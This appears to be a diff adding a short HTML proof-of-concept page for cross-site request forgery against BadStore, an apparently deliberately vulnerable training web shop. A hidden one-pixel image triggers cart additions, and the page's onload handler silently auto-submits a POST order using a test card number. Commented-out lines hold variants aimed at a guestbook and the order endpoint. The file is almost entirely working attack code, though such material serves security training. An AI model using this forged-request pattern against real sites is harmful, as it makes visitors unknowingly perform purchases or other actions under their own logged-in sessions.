@@ -1,0 +1,30 @@
+<html>
+
+<script type="text/javascript">
+function postwith (to,p) {
+  var myForm = document.createElement("form");
+  myForm.method="post" ;
+  myForm.action = to ;
+  for (var k in p) {
+    var myInput = document.createElement("input") ;
+    myInput.setAttribute("name", k) ;
+    myInput.setAttribute("value", p[k]);
+    myForm.appendChild(myInput) ;
+  }
+  document.body.appendChild(myForm) ;
+  myForm.submit() ;
+  document.body.removeChild(myForm) ;
+}
+
+
+</script>
+
+<img src="http://www.badstore.net/cgi-bin/bsheader.cgi?fname=whatsnew_func&action=cartadd&args=1000&cartitem=1000&args=1003&cartitem=1003&args=1008&cartitem=1008&pjxrand=0.15216958115367174" width="1" height="1" border="0">
+<body onload="postwith('http://www.badstore.net/cgi-bin/badstore.cgi?action=order',{ccard:'4111111111111111',expdate:'1212'})">
+
+<!--<a href="javascript:postwith('http://192.168.128.167/cgi-bin/badstore.cgi?action=doguestbook',{name:'peter',email:'aus',comments:';'})">click</a>;-->
+
+<!--<a href="javascript:postwith('http://www.badstore.net/cgi-bin/badstore.cgi?action=order',{ccard:'4111111111111111',expdate:'1212'})">click</a>;-->
+
+</body>
+</html>
